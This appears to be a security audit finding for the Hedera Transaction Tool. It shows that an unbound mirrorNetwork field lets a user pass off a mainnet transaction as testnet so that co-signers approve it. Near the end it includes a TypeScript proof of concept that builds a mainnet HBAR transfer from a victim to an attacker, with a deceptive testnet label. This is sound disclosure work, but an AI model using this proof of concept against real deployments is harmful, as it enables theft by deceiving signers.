Audit Report

## Title
Malicious Registered User Can Trick Co-Signers Into Unknowingly Authorizing Mainnet Transactions Labeled as Testnet

## Summary
The `mirrorNetwork` field in `CreateTransactionDto` is user-supplied and is not cryptographically bound to `transactionBytes`. Because Hedera mainnet and testnet share overlapping node account IDs (0.0.3–0.0.9), a malicious registered organization user can submit a real mainnet transaction with `mirrorNetwork: 'testnet'`, pass all server-side validation, and collect co-signer signatures from users who believe they are signing a harmless testnet transaction.

## Finding Description

**Root cause — `mirrorNetwork` is not signed and not cryptographically bound to `transactionBytes`.**

In `validateAndPrepareTransaction`, the signature verification covers only `dto.transactionBytes`:

```ts
const validSignature = publicKey.verify(dto.transactionBytes, dto.signature);
``` [1](#0-0) 

The `mirrorNetwork` value is accepted from user input with no binding to the signed payload. The `CreateTransactionDto` declares it as a plain `@IsString()` field with no enum restriction or server-side derivation: [2](#0-1) 

**The client used for node validation is built directly from the attacker-controlled field:**

```ts
const client = await getClientFromNetwork(dtos[0].mirrorNetwork);
``` [3](#0-2) 

`getClientFromNetwork` calls `Client.forName(mirrorNetwork[0])` for the well-known network names, so passing `'testnet'` produces a testnet client: [4](#0-3) 

**Why the node-validation guard fails:** `isTransactionValidForNodes` compares account ID strings only — it does not inspect network endpoints or ledger IDs:

```ts
return txNodeIds.every((id) => allowedNodeAccountIds.has(id));
``` [5](#0-4) 

Hedera mainnet and testnet share node account IDs 0.0.3–0.0.9. A mainnet transaction constructed with only those node IDs passes testnet node validation because the account ID strings are identical on both networks.

**The stored `mirrorNetwork` comes from the attacker-controlled DTO field**, not from the validated client:

```ts
mirrorNetwork: dto.mirrorNetwork,
``` [6](#0-5) 

**The signed transaction bytes are fully exposed via the API.** `TransactionDto` serializes `transactionBytes` as hex in every response: [7](#0-6) 

And `GET /transactions/:id` returns the full `TransactionFullDto` (which extends `TransactionDto`) to any user with access: [8](#0-7) 

## Impact Explanation

Co-signers unknowingly authorize real mainnet transactions. Depending on the transaction type, this enables:

- **Unauthorized HBAR transfers** on mainnet, draining accounts that require multi-party approval.
- **Unauthorized `AccountUpdateTransaction`** replacing account keys on mainnet.
- **Unauthorized `FileUpdateTransaction`** modifying Hedera system files (fee schedules, address books) — the tool is explicitly used for these high-stakes operations by the Hedera Council.

The Hedera Transaction Tool's stated purpose is managing high-stakes network operations for the Hedera Council. A successful attack against council members signing what they believe is a testnet transaction constitutes a critical integrity failure.

## Likelihood Explanation

The attacker requires only a registered organization user account — no admin, operator, or governance keys. The attack requires no cryptographic breaks, no race conditions, and no special timing. It is fully deterministic and repeatable. The only prerequisite is that the attacker's key is enrolled in the organization, which is a normal onboarding step.

## Recommendation

1. **Derive `mirrorNetwork` from the transaction bytes on the server side**, not from the DTO. Parse the `LedgerId` embedded in the frozen transaction bytes (available via `sdkTransaction.getLedgerId()` after freezing) and use that to determine the network. Reject the request if the derived ledger ID does not match the claimed `mirrorNetwork`.

2. **Alternatively, bind `mirrorNetwork` into the signed payload.** Require the creator to sign a message that includes both `transactionBytes` and `mirrorNetwork` (e.g., `sign(hash(mirrorNetwork || transactionBytes))`), so any mismatch invalidates the signature.

3. **Restrict `mirrorNetwork` to an enum** in `CreateTransactionDto` and validate that the `LedgerId` embedded in the transaction bytes corresponds to the declared network.

## Proof of Concept

```ts
import {
  AccountId, Client, PrivateKey, TransferTransaction, TransactionId, Hbar
} from '@hiero-ledger/sdk';

// 1. Attacker generates a key enrolled in the organization (creatorKeyId = N)
const attackerKey = PrivateKey.fromStringED25519('<attacker_private_key>');

// 2. Build a MAINNET TransferTransaction using only node IDs shared with testnet
const tx = new TransferTransaction()
  .setTransactionId(TransactionId.generate('0.0.VICTIM_ACCOUNT'))
  .setNodeAccountIds([
    AccountId.fromString('0.0.3'),
    AccountId.fromString('0.0.4'),
    AccountId.fromString('0.0.5'),
  ])
  .addHbarTransfer('0.0.VICTIM_ACCOUNT', new Hbar(-100))
  .addHbarTransfer('0.0.ATTACKER_ACCOUNT', new Hbar(100))
  .freezeWith(Client.forMainnet());

const txBytes = tx.toBytes();

// 3. Sign only the transaction bytes (mirrorNetwork is NOT included)
const signature = attackerKey.sign(txBytes);

// 4. POST to /transactions with mirrorNetwork: 'testnet' — all checks pass
// POST /transactions
// {
//   name: "Routine testnet key rotation",
//   description: "Please sign - testnet maintenance",
//   transactionBytes: Buffer.from(txBytes).toString('hex'),
//   mirrorNetwork: "testnet",          // <-- lie: this is actually mainnet
//   signature: Buffer.from(signature).toString('hex'),
//   creatorKeyId: N
// }

// Server validation:
//   - publicKey.verify(txBytes, signature)  => true  (signature is valid)
//   - isExpired(tx)                         => false
//   - getNodeAccountIdsFromClientNetwork(Client.forTestnet())
//       => includes 0.0.3, 0.0.4, 0.0.5    => isTransactionValidForNodes => true
//   - stored mirrorNetwork = 'testnet'      (attacker-supplied)

// 5. Co-signers see "testnet" label, sign the transaction bytes
// 6. Attacker retrieves fully-signed bytes from GET /transactions/:id
// 7. Attacker submits directly to mainnet — transaction executes
```

export const isTransactionValidForNodes = (
  sdkTransaction: SDKTransaction,
  allowedNodeAccountIds: Set<string>
): boolean  => {
  const nodeAccountIds = (sdkTransaction as any)._nodeAccountIds;
  const txNodeIds: string[] = [];
  if (
    nodeAccountIds &&
    typeof nodeAccountIds.length === 'number' &&
    typeof nodeAccountIds.get === 'function'
  ) {
    for (let i = 0; i < nodeAccountIds.length; i++) {
      const id = nodeAccountIds.get(i);
      const accountId =
        id instanceof AccountId ? id : AccountId.fromString(String(id));
      txNodeIds.push(accountId.toString());
    }
  }

  return txNodeIds.every((id) => allowedNodeAccountIds.has(id));
};
```
